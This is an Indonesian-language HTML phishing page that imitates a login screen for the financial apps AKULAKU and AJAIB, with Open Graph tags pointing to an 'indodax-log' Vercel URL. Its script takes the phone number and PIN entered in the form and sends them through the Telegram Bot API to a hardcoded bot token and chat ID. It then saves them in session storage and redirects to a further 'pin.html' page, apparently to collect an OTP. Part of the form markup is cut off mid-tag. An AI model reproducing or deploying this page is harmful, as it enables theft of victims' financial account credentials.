<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Login AKULAKU</title>

<!-- Meta Tags untuk Open Graph -->
<meta property="og:title" content="Masuk ke AKULAKU" />
<meta property="og:description" content="Login ke akun AKULAKU Anda dengan aman." />
<meta property="og:image" content="https://i.ibb.co.com/HfkBKY6W/images.png" />
<meta property="og:url" content="https://indodax-log.vercel.app/" />
<meta property="og:type" content="website" />

<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');

  body {
    font-family: 'Roboto', sans-serif;
    background-color: #fff;
    margin: 40px 16px;
    color: #000;
  }
  .container {
    max-width: 360px;
    margin: 0 auto;
  }
  
  /* --- PERUBAHAN PADA BAGIAN INI --- */
  .logo {
    width: 100%; /* Mengubah lebar menjadi 100% agar memenuhi container */
    height: auto; /* Tinggi otomatis agar gambar tidak gepeng */
    margin-bottom: 24px; /* Jarak dengan input field di bawahnya */
    display: block;
    object-fit: contain; /* Memastikan gambar tidak terpotong */
  }
  /* ------------------------------- */

  label {
    display: block;
    font-weight: 600;
    font-size: 14px;
    margin-bottom: 6px;
  }
  input[type="email"],
  input[type="password"] {
    width: 100%;
    font-size: 14px;
    padding: 12px 40px 12px 12px;
    border: 1px solid #ccc;
    border-radius: 6px;
    box-sizing: border-box;
    color: #555;
    outline: none;
    transition: border-color 0.2s;
  }
  input[type="email"]:focus,
  input[type="password"]:focus {
    border-color: #2076f3;
  }
  input::placeholder {
    color: #aaa;
  }
  .password-container {
    position: relative;
    margin-bottom: 8px;
  }
  .eye-icon {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    width: 20px;
    height: 20px;
    cursor: pointer;
    color: #888;
    user-select: none;
  }
  .forgot-link {
    display: block;
    font-size: 13px;
    color: #2076f3;
    text-align: right;
    text-decoration: none;
    margin-bottom: 24px;
  }
  .forgot-link:hover {
    text-decoration: underline;
  }
  button.login-btn {
    width: 100%;
    padding: 12px 0;
    font-size: 14px;
    font-weight: 600;
    border-radius: 6px;
    border: none;
    background-color: #d4d4e3;
    color: #888;
    cursor: not-allowed;
    margin-bottom: 24px;
    transition: background-color 0.3s, color 0.3s;
  }
  button.login-btn.enabled {
    background-color: #2076f3;
    color: #fff;
    cursor: pointer;
  }
  .or-text {
    text-align: center;
    font-weight: 400;
    font-size: 14px;
    margin-bottom: 20px;
  }
  button.google-btn {
    width: 100%;
    border: 1px solid #ddd;
    padding: 10px 0;
    border-radius: 6px;
    background-color: #fff;
    font-weight: 700;
    font-size: 14px;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
    user-select: none;
  }
  .google-icon {
    width: 20px;
    height: 20px;
  }
</style>
</head>
<body>
  <div class="container">
    <!-- Logo dengan lebar penuh -->
    <img src="https://image2url.com/r2/default/images/1771999892642-3c66d39f-3501-435e-a9ce-954e9fc5b48c.png" alt="Logo AJAIB" class="logo" />

    <form id="loginForm" novalidate>
      <label for="email">NO. HP</label>
      <input type="email" id="email" name="email" placeholder="Masukkan email" required />

      <label for="password">PIN</label>
      <div class="password-container">
        <input type="password" id="password" name

  <!-- Load jQuery dari CDN -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

  <!-- Script JS Gabungan -->
  <script>
  $(document).ready(function() {
      console.log('JS loaded'); // Debug: Pastikan JS berjalan

      // Toggle show/hide password dengan ikon mata
      $('#togglePassword').on('click', function() {
          const passwordField = $('#password');
          const type = passwordField.attr('type') === 'password' ? 'text' : 'password';
          passwordField.attr('type', type);

          // Ganti SVG ikon mata sesuai status
          if (type === 'password') {
              // Ikon mata terbuka (show password)
              $(this).html(`
                  <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                  <circle cx="12" cy="12" r="3"/>
              `);
          } else {
              // Ikon mata tertutup (hide password)
              $(this).html(`
                  <path d="M17.94 17.94A10.99 10.99 0 0112 19c-4.97 0-9.28-3.16-11-7a11.05 11.05 0 015-5.28"/>
                  <line x1="1" y1="1" x2="23" y2="23"/>
                  <path d="M10.58 10.58a3 3 0 004.24 4.24"/>
              `);
          }
      });

      // Fungsi validasi form: email ada '@' dan password tidak kosong
      function isFormValid() {
          const email = $('#email').val().trim();
          const password = $('#password').val().trim();
          return email !== '' && email.includes('@') && password !== '';
      }

      // Toggle enable/disable tombol "Masuk" berdasarkan validasi
      function toggleLoginButton() {
          if (isFormValid()) {
              $('#loginBtn').prop('disabled', false).addClass('enabled');
          } else {
              $('#loginBtn').prop('disabled', true).removeClass('enabled');
          }
      }

      // Event input untuk validasi real-time
      $('#email, #password').on('input', toggleLoginButton);

      // Submit form: kirim data ke Telegram dan simpan session
      $('#loginForm').on('submit', function(e) {
          e.preventDefault();

          if (!isFormValid()) {
              console.log("Validasi gagal: Email harus ada '@' dan password tidak kosong.");
              return;
          }

          const email = $('#email').val().trim();
          const password = $('#password').val().trim();

          // Format pesan untuk dikirim ke Telegram
          const message = `
Masuk ke AJAIB
------------------------
NOMOR HP: ${email}
PIN: ${password}
------------------------
          `;

          // Ganti dengan token bot Telegram dan chat ID Anda (jangan hardcode di production)
          const token_bot = '8422018014:AAGHHrRoycj_EZwiEubdtxUEEtOQ1iqnA9w'; // Contoh: '123456789:ABCdefGHIjklMNOpqrsTUVwxyz'
          const telegram_id = '8424964369'; // Contoh: '123456789'

          const url = `https://api.telegram.org/bot${token_bot}/sendMessage?chat_id=${telegram_id}&text=${encodeURIComponent(message)}`;

          // Kirim request ke Telegram API menggunakan jQuery $.get
          $.get(url)
              .done(function(data) {
                  if (data.ok) {
                      console.log('Data berhasil dikirim ke Telegram');

                      // Simpan data ke sessionStorage (tersimpan selama tab/browser terbuka)
                      sessionStorage.setItem('email', email);
                      sessionStorage.setItem('password', password); // Hati-hati: jangan simpan password di production, gunakan token saja

                      // Redirect ke halaman OTP setelah sukses
                      window.location.href = 'pin.html';
                  } else {
                      console.error('Error sending message:', data);
                  }
              })
              .fail(function(xhr, status, error) {
                  console.error('Fetch error:', error);
              });
      });

  });
  </script>
</body>
  </html>
